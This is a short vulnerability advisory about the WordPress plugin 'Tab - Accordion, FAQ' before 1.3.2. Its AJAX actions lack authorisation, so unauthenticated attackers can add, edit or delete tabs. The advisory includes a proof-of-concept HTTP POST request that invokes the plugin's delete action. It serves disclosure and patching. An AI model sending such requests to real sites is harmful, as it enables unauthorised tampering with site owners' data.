## WordPress Plugin Vulnerabilities

# Tab - Accordion, FAQ < 1.3.2 - Unauthenticated AJAX Calls

### Description

All AJAX actions of the plugin are available to both unauthenticated and authenticated users, allowing unauthenticated attackers to modify various data in the plugin, such as add/edit/delete arbitrary tabs.

v1.3.0 added CSRF checks, however authorisation was still missing and has been added in 1.3.2

### Proof of Concept

POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 42
Connection: close
action=RW\_Tabs\_Man\_Delete\_Opt&Deleted\_ID=4
